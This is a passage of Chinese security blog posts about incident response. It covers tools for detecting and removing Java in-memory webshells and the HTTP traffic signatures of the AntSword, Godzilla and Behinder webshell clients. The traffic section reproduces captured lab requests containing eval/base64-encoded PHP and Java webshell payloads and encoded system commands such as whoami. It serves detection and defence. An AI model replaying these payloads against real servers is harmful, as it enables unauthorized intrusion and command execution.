输入验证和过滤\n安全配置服务器\n升级解析器版本\n定期安全审计\n","date":"2025-06-22T21:40:00+08:00","image":"https://lserein.github.io/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/logo_hu_902d8af0c827348e.png","permalink":"https://lserein.github.io/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"XML外部实体注入漏洞"},{"content":"应急响应—内存马排查与查杀\nhttps://mp.weixin.qq.com/s/mBI3B8sBeT8DzVi6FFQq6w\n奇安信攻防社区-应急响应——全类型JAVA内存马排查\n1.Servlet-API类内存马\u0026mdash;java-memshell-scanner Filter/Servlet型内存马的扫描抓捕与查杀\n使用这个工具进行查和杀：https://github.com/c0ny1/java-memshell-scanner\n支持Servlet/Filter/Listener类型内存马，使用只要将项目的JSP文件运行到网站根目录即可直接访问\n效果：如下图中名称里面带$表示匿名内部类，这种也是比较可疑的，一般来说三大组件里面的类都是有正常名的，出现这种情况，大概率时攻击者构造内存马的时候创建相关恶意组件类实例，没有命名，创建的是匿名类实现对应接口，可以看到十分简单快捷的找出了上面三种内存马；（一般实战中攻击者比较喜欢使用filter类型的马，我们可以观察Patern字段，这个字段是该filter过滤的url特征）；然后一般情况下，我们需要关注一些重点业务实例类，也就是可能存在被利用的servlet组件实例，比如下图中，我们都是通过jsp去注入的内存马，jsp本身就是一个特殊的servlet，所以我们看到所以的匿名内部类的外部类都是jsp下的一个实例类\n可以对页面疑似存在内存马的类进行导出，将导出的代码使用JADX反编译查看源码中是否存在恶意代码，存在即可kill掉\n问题1：对于Listener的内存马，点击Kill，内存马无法有效删除 问题2：使用这个tomcat-memshell-scanner导出恶意类进行分析时，当前项目的JDK版本不能超过11，超过11无法成功导出 对于Filter类型的内存马，如果你成功查杀一次，那么只要服务器不重启，无法在注入相同的内存马 但是对于Servlet类型的内存马，你查杀一次，但是没删除对应注入内存马的.jsp文件，还是可以继续注入内存马 还有个问题就是当项目真正运行时上传jsp文件到文件目录下无法访问，需要重启项目才能正常访问 1.1.使用哥斯拉注入内存马 浅谈冰蝎、哥斯拉内存马排查思路\n我这里使用哥斯拉无法注入内存马（原因是我的Tomcat版本为10版本，并且使用的依赖是jakarta.servlet-api），解决方法将tomcat10降级为tomcat9，即可注入成功。换了个哥斯拉特战版注入成功后，使用工具将内存马删除后，发现还是能正常连接，并且无法dump出恶意文件，太奇怪了\n1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;jakarta.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jakarta.servlet-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;6.0.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 2.cop.jar 项目地址：https://github.com/LandGrey/copagent\n这个就没有像上面那个这么智能了，cop.jar 会把正在运行的 java应用文件全部还原为jsp文件，然后我们可以下载到本地，用D盾或者其它杀软进行查杀。使用cop.jar这个工具时要注意jdk版本，jdk版本过高经常卡死\n1 java -jar cop.jar 3.shell-anaylzer 缺点：不能查杀Spring框架型内存马，只能查杀Servlet-API型内存马\n项目地址：https://github.com/4ra1n/shell-analyzer\n内存马检测工具shell-analyzer（1）最初版展示与设计思路\n内存马检测工具shell-analyzer（2）远程查杀实现\n1 2 3 agent.jar是核心文件，请保持与gui.jar或remote.jar同目录 gui.jar是GUI客户端，本地和远程分析都需要 remote.jar用于远程分析，本地分析无需下载 本地查杀 1 本地上运行：java -jar gui.jar 即可对当前Java进程中所有Servlet组件进行分析，反编译对应的代码，将可疑代码可以使用AI进行分析也可以保存使用WebShell查杀工具进行查杀\n将可以类名字复制出来进行删除即可，这只能删除内存马，没法删除WebShell，删除后刷新依然会继续显示，但是实际上哥斯拉已经无法连接了\n远程查杀 1 2 3 4 5 6 7 8 //启动服务端，服务端，中内存马的机器 java -cp remote-0.1.jar:/usr/lib/jvm/java-11-openjdk-amd64/lib/tools.jar com.n1ar4.RemoteLoader 12149 adminasd java -cp jdk1.8.0_202/lib/tools.jar:remote-0.1.jar com.n1ar4.RemoteLoader 12149 1qaz2wsx //客户端：查杀内存马的机器 jar tf gui-0.1.jar //查看这个gui-0.1的所有包名 java -jar gui-0.1.jar 4.Arthas 优点：可以查找所有类型的内存马，包括Spring Controller类型和Interceptor类型内存马\n简明的Arthas使用教程\n项目地址：https://github.com/alibaba/arthas/releases\n最后一个工具就是Arthas，这个其实就是一个JAVA的排查工具，它会帮你列出当前程序加载的类，当前就只有Tomcat这个Java程序在运行。\n1 2 3 4 5 6 7 8 9 10 11 curl-O https://arthas.aliyun.com/arthas-boot.jar //下载arthas java -jar arthas //运行arthas Arthas常用命令： dashboard：显示当前应用程序的实时运行状况，包括 CPU 使用率、内存使用情况、线程情况等 jvm：查看和管理 JVM 的相关信息，包括堆内存、GC 状态、类加载情况等 sc：查看和搜索类信息，包括加载的类、类的字段和方法等。 sm：查看和搜索方法信息，可以查看方法的字节码、参数、返回值等 jad：反编译指定类的字节码，查看类的实现代码。 classloader：显示当前应用程序中所有的类加载器及其层次结构。可以查看每个类加载器的名称、父加载器和已加载的类数量 heapdump 生成 Java 应用程序的堆转储（Heap Dump）文件 1 2 3 4 5 6 7 8 9 10 11 sc *.Servlet //列出所有Servlet的类 sc *.Filter //列出所有Filter sc *Interceptor* //列出所有Interceptor拦截器 sc *Controller* //列出所有Controller jad org.springframework.web.servlet.DispatcherServlet //反编译恶意类 classloader //查看所有classlaoder jad --source-only org.apache.coyote.MapperFeature \u0026gt; 1.java //反编译类重定向到本地 4.1.使用Arthas查找Spring框架内存马 https://mp.weixin.qq.com/s/53M9HowgJC6wZHNO6iEYPQ\nhttps://forum.butian.net/share/4053\n将可疑的Controller层代码和Interceptor代码反编译到本地进行分析\n杀掉这个内存马感觉只能靠重启Spring中间件了\n5.FindShell https://github.com/geekmc/FindShell\n1 java -jar FindShell.jar --pid [PID] --repair 万不得已，重启Java中间件\n案例：使用Shiro反序列化靶场来搭建 使用工具一键注入4种类型内存马\n使用Arthas进行排查，可以看到存在可以的Filter\n1 2 //导出到当前目录的1.java文件夹下 jad --source-only com.sma11new.exp.javaFrame.shiro.payload.build.BehinderFilter \u0026gt; 1.java Arthas好像不具备杀内存马功能，只具备查找和反编译功能，杀我这使用的是shell-analyzer\n","date":"2025-06-21T23:41:51+08:00","image":"https://lserein.github.io/p/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/logo_hu_f299fad8d97501e8.png","permalink":"https://lserein.github.io/p/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80/","title":"Java内存马查杀"},{"content":"不管什么样的WebSHell，都有一个相同的特征就是某个端口连接服务器的Web端口，并且一直访问某JSP/Php脚本文件\n1.蚁剑 1.1.php_Default/Base64 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 POST /gsl.php HTTP/1.1 Host: 192.168.100.133 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Content-Type: application/x-www-form-urlencoded Content-Length: 1669 Connection: close bf827d814d798a=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjFjYzVjIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO30kdG1kaXI9cmVhbHBhdGgoJHRtZGlyKTtAY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiOWZmIi4iYzA5IjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICI3MzU2NCIuImUzNWYyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D\u0026amp;pass=%40eval(%40base64_decode(%24_POST%5B\u0026#39;bf827d814d798a\u0026#39;%5D))%3BHTTP/1.1 200 OK Date: Wed, 18 Jun 2025 07:40:49 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 X-Powered-By: PHP/7.3.4 Connection: close Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 9ffc09C:/phpstudy/phpstudy_pro/WWW\tC:D:\tWindows NT WIN-DOBBDD1N0D6 10.0 build 17763 (Windows Server 2016) AMD64\tAdministrator73564e35f2 强特征1：执行的命令返回包未进行加密，\n强特征2：数据包中存在危险函数@eval，base64_decode等字段\n1 2 pass=@eval(@base64_decode($_POST[\u0026#39;b3f36b9af58629\u0026#39;]) b3f36b9af58629是开头的字段 请求头字段很简单，没有哥斯拉这种phpsessionid等字段\n1.2.Php_char模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 POST /gsl.php HTTP/1.1 Host: 192.168.100.133 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 26940 Connection: close nd6b2b120b5a9d=RVY21k\u0026amp;p61a95d34cfd66=CZY2QgL2QgIkM6XFxwaHBzdHVkeVxccGhwc3R1ZHlfcHJvXFxXV1ciJmRpciZlY2hvIDg1MWZlODAwOGVhJmNkJmVjaG8gNTE5ZTNjMDk3YWQ%3D\u0026amp;pass=%40eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(61).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(103).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36)... HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 07:52:26 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 X-Powered-By: PHP/7.3.4 Connection: close Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 60fa2 ...... C ................ ............ 027E-C198 C:\\phpstudy\\phpstudy_pro\\WWW ...... 2025/06/18 15:41 \u0026lt;DIR\u0026gt; . 2025/06/18 15:41 \u0026lt;DIR\u0026gt; .. 2025/06/18 12:04 \u0026lt;DIR\u0026gt; %SystemDrive% 2023/08/03 09:44 1,295 1.php 2025/05/10 21:14 26 a.php 17 ...... 246,207,820 .... 9 ...... 43,056,951,296 ........ 851fe8008ea C:\\phpstudy\\phpstudy_pro\\WWW 519e3c097ad d49ae43c 总的来说，不管什么模式的蚁剑，流量特征都很明显\n执行的命令返回包未进行加密 数据包中存在危险函数@eval，base64_decode,@iniset等字段等字段 1.3.Java_default模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 POST /yj.jsp HTTP/1.1 Host: 192.168.100.133 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0 Content-Type: application/x-www-form-urlencoded Content-Length: 8961 Connection: close c91a1042cfa507=y5Y2QgL2QgIkM6L0pzcHN0dWR5L3RvbWNhdC9iaW4iJndob2FtaSZlY2hvIDcyMjYwNmJkNjU1YiZjZCZlY2hvIDAwMTJjMmU0MWY%3D\u0026amp;iaf40aaecc6976=Dh\u0026amp;passwd=yv66vgAAADEBgwoAZgCiCQCCAKMJAIIApAgApQkAggCmCACnCQCCAKgIAKkJAIIAqgoAggCrBwCsCgALAKIIAK0IAK4IAK8IALAIALEIALIIALMLAGAAtAsAXwC1CwBgALULAF8AtgoAggC3CQCCALgKAIIAuQoACwC6BwC7BwC8CgAdAKIIAL0KAB0AvgoAHAC%2FCgAdAL8LAGAAwAoACwC%2FCgCCAMEKAMIAwwoAxADFCgA3AMYIAMcKADcAyAgAyQgAygoANwDLBwDMCgA3AM0KAC4AzgoANwDPCgA3ANAKAB0A0QgA0goALgDTCgAuANQHANUKAIIA1goANwDXCgCCANgIANkIANoKANsA3AcA3QoAPgDeCADfCgA3AOAIAOELAOIA4wsA4gDkCwDiAOULAOYA5wsA6ADpCwDoAOoIAOsLAOIA7AoA7QDuCgDtAO8KAPAA8QoAggDyCgDwAPMIAPQKANsA9QoANwD2CAD3CgA3APgHAPkHAPoKAFYA%2BwoAVQD8CgBVAP0IAP4KAFUA%2FwoAZgEACgBkAQEHAQIHAQMHAQQIAQUKAGQBBggBBwcBCAoAZAEJBwEKCgELAQwIAQ0IAIMKAGQBDgoBDwEQ............... HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 08:06:19 GMT Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17 Set-Cookie: JSESSIONID=0F95EEF71FACC7B91F36CC28C4422E50; Path=/; HttpOnly Content-Type: text/html;charset=UTF8 Content-Length: 104 Connection: close 40ef7330774dwin-dobbdd1n0d6\\administrator 722606bd655b C:\\Jspstudy\\tomcat\\bin 0012c2e41f 0a60f2ce1 强特征：执行的命令在返回包中明文传输 请求包参数中存在WebShell的连接密码，并且没有进行加密 2.哥斯拉4.0 2.1.Php_EVAL_XOR_BASE64模式流量特征 https://mp.weixin.qq.com/s/VPWLGL6Ild9VpC2jeqM_dA\nhttps://mp.weixin.qq.com/s/hIpobgYkfwNM06rKZZHOhA\n连接上WebSHell后主要进行了命令执行，文件上传，文件下载，文件修改和连接本地数据库\n1 2 3 4 5 6 7 8 9 10 11 12 POST /gsl.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Host: 192.168.100.133 Connection: keep-alive Content-type: application/x-www-form-urlencoded Content-Length: 53767 pass= GIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWb HTTP/1.1 200 OK 特征有以下\nConnection显示为Keep-alive，表示为长连接 连接Webshell时Content-Length长度特别大53767，一般请求包长度没有这么大 传输数据中显示WebShell连接密码为pass，存在危险函数eval 1 pass=eval(base64_decode(strrev(urldecode(\u0026#39; 返回包数据是无规律的加密字符串，但是返回包字符串中==后都会跟着一串相同的字符串，状态码为200 返回包中存在PhpSessionID 2.2.单纯php_base64加密 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /gsl64.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0 Cookie: PHPSESSID=cho3pe4isrirht2omuo3p05oct; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Host: 192.168.100.133 Connection: keep-alive Content-type: application/x-www-form-urlencoded Content-Length: 113 pass=fL1tMGI4YTljMf5%2FH%2F2pfJJ9qX0HWgZZA3l6H0P%2FrXou%2F0kyafFjvP%2BcwTkAPut4KWVP0e7A45sfzMXCQklhCG3Seg9iOGE%3D HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 06:31:29 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 X-Powered-By: PHP/7.3.4 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Set-Cookie: PHPSESSID=cho3pe4isrirht2omuo3p05oct; path=/ Keep-Alive: timeout=5, max=96 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 11cd6a8758984163fL1tMGI4YTljO0Ch/0aDA3OyqtJLRKhoJQLPg5ZvC4qNEywlGZtBb2Ek9Rz5ENF83BVcqOccVvOdDebh7wAOoDxIv5654H7TsMlW40T5FQ38ecKj2f8y1aBf41/s93wgbzMPHm4/OjkZkAlYSM5RrCN/OgMquIX7ERA+045mfzdgQl8BLYsHgBs2HW/LQ1LxYz9j3ffOMwo3N6mi9Ibm+jCFGq2/NwoK++cPvdKxeuVNGQ559d5BMxk6/1lWXHOCmajFReSmBNu3H1Zu5sEATBayhNhws0OIsdVE/YnOY5pfhk+waswJoPFIV9qIklr4LUXjyz56U8l5hmKA+mQ0F7bgbvmGoVDT9YO8oPCXAoXxP77ciUhN7p5frgtCaNlfC9DxVUp9FDjcW6LWJzGk86K22AS94yHIs3gskMWLLsSWWNZnxxWUYe/ga3M8B4SzAX4d5353Nnp2dqZz0R1Hc/A9tw3lI+C7Z+tZOdcdPLVth8pzHtsxa/DJpH4485H2RzbKBWE1t9DP0/oWnPcXSEaVh9BokDMNuQD5DPfs3G/Knt3wBis3p/91oH3Yd430ARR4pHCudKwGec3iXK8EzhwxlxVwBR1PgxKZpF9Psn3Xs1X5XOKFdcYO9Od9FJw0bmWP/IczdnrC9uixzP4Kep+Gni8pnAs3mjI1Mg==6c37ac826a2a04bc 大体和php_EVAL_XOR_Base64差不多，只是数据包中不存在这个函数eval和base64Decode这两个函数\n2.3.Java_AES_BASE64模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 POST /gsl.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0 Cookie: JSESSIONID=A80ED3542DB7B279B78BB97B7CEFE172; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Host: 192.168.100.133 Connection: keep-alive Content-type: application/x-www-form-urlencoded Content-Length: 73 pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 06:43:00 GMT Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 76 Keep-Alive: timeout=5, max=99 Connection: Keep-Alive 11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC 和php的流量特征及其相似，不管是请求包还是返回包，JSP的哥斯拉返回包没有phpsessionID这个字段，但是明文webshell连接密码还是存在\n总结：哥斯拉流量特征主要有以下几个方面\n强特征1：连接均采用长连接（Keep-ALive） 强特征2：WebShell连接密码明文显示在请求包中，默认为pass 强特征3：对应php的哥斯拉，返回包存在phpsessionID字段，JSP的没有 强特征4：返回包密文最后结尾总是一串16位的md5值（6C37AC826A2A04BC） 3.哥斯拉特战版（二开的哥斯拉） 项目地址：https://github.com/ekkoo-z/Z-Godzilla_ekp\n3.1.JAVA_AES_RAW_BASE64模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 POST /gslshell.jsp HTTP/1.1 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Accept-Encoding: gzip, deflate, br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Connection: close Content-Type: application/octet-stream Cookie: JSESSIONID=ABD1AB4546483A638A9C96E4C4373A07 Cache-Control: no-cache Pragma: no-cache Host: 192.168.100.133 Content-Length: 64 0mQU+S1pFnTz3ttVTnAgJVD/aBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 07:13:23 GMT Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17 Content-Type: text/xml;charset=UTF-8 Content-Length: 122 Connection: close 8BB3709BB1B23E80V+RK7jG2F/1Yj1Tg/3uyr09T21aOsG3Md1eladPmEKaKpejnv0tGhDPtGzFDjYTCNLG9WNAwDUBX KrL66qwWdQ==F6943A54B7703F5F 相较于原始版本的哥斯拉，特战版本哥斯拉几乎将强特征全部隐藏了，与原始版本哥斯拉不同点在于\nContent-Type类型变成了application/octet-stream 请求头字段可以自己设置 在Cookie中新增了JSESSIONID 但是返回包末尾的16位md5值没有改变，依旧存在 4.冰蝎 4.1.冰蝎3\u0026mdash;JSP\u0026mdash;默认下流量特征 由于冰蝎和哥斯拉都可以自定义请求头，所以光看请求头并不能确保100%是对应的流量，在此讨论的是默认状态下冰蝎3的流量特征\n请求头中包含Cookie字段，值为JSESSIONID 请求头中Connection为长连接，从请求头来看和哥斯拉很像 请求体内容中不存在敏感函数和连接密码，但是返回包中字段内容很特殊，由很多点?等特殊字符组成，不像其它WebSHell一样是一串字符串或者是明文 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 POST /beyond.jsp HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Content-Type: application/octet-stream Referer: http://192.168.100.133/beyond.jsp User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0) Cache-Control: no-cache Pragma: no-cache Host: 192.168.100.133 Connection: keep-alive Content-Length: 9196 Cookie: JSESSIONID=E7EBE85F325DA037345274E855AC2BB9; DwTyi2tOkoUj0XJVagEtJ3znCXjy0giLcAQ8qq0p1b17r0qDueXrcIKCYfyBuyJJbXMntG4z46O4p5DcJpgOt/Bkw5g7sZt+Czuqj6BhzR2N2J0iA5iqOxT4+pPrOAzbeeLARy7GgcknRACWoceMRF8onIBG8ceY21mD1X3ynE6aBaX7zoeCigO/wc/ygw5QUq4vDTLFNKQRx232qyLQP588v12r/owpM5FRoH4IRlSZ/NIGhnlVfe8SyEDRnIif+q2vL1+qZpkLqAlBA9rPwhj6/CwCqU5R5iS7U3U25FsUjgqTKpiihB7Icl/n6pwECMs3QjZTRkNn5zbKZCSiJtk14FyhCcz4kwl6sZSrby6BGQhIRpHN+gNSh4vvYQ6/CFn6GJybl/k9DwvCYTO065OSTivNzKqbuw8ozDyvFazRH2+EHjAAoTO6bAsjZiEjEZm/oppqxS4Zv6o8gxuW0C25yiiVZjRcB/MoRESgC9V7awIX0xO/MW0LUgZzD8dqufLEqfcEykzPf3RT67YGU5qO6t98qwidRnLWmvGw+Fc2r0MbNzYkAPW7N5zNPS83bQgcRO1unC+nnNNXVKXOR/fVs2BDjYsceyY9sD2V7AYXBHRrujuUMeYFbEjngSQB2q/KvSHX4XSFxpTP/utE+eSrMw6Xz/MPJE91jz2/aRA38dOBr8S/z3JgVpmgMwPsJk+CqJVle1Suv+h8sprfF62qUjikUv1ZhE75Va/MsOhxyQrjKROISK0ebexAxp+rQGCQmwCs+8WHk5FocTkcK9c8Qw3jiZ4kl5TedFltnXNtZ8BuW0h7/be0d9UP04Pt235FEzXYgsDlw1tnQcgu6FJDFlR1Nw06z7viyfMMpwP/+Yg31nwfPQHqec1k61fu+............................. HTTP/1.1 200 OK Date: Wed, 18 Jun 2025 12:08:49 GMT Server: Apache/2.4.18 (Win32) OpenSSL/1.0.2e PHP/5.2.17 Content-Type: text/html;charset=UTF-8 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked .../9.....L..[.....-..m.c.,\u0026amp;.*K......=.?......x............}Y......S_...?..S@.\u0026amp;. 4.2.冰蝎3\u0026mdash;PHP\u0026mdash;默认下流量特征 请求头中包含PHPSESSIONID/Cache-Control等字段 请求体中不存在敏感字符，都是AES+BASE64加密的字符 Php返回包为一串字符串，没有特殊符号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 POST /beyond.php HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Content-type: application/x-www-form-urlencoded Referer: http://192.168.100.133/beyond.php User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Cache-Control: no-cache Pragma: no-cache Host: 192.168.100.133 Connection: keep-alive Content-Length: 5760 Cookie: PHPSESSID=6j0pvmbidjuf9rdese2t6bp5fb;PHPSESSID=6j0pvmbidjuf9rdese2t6bp5fb 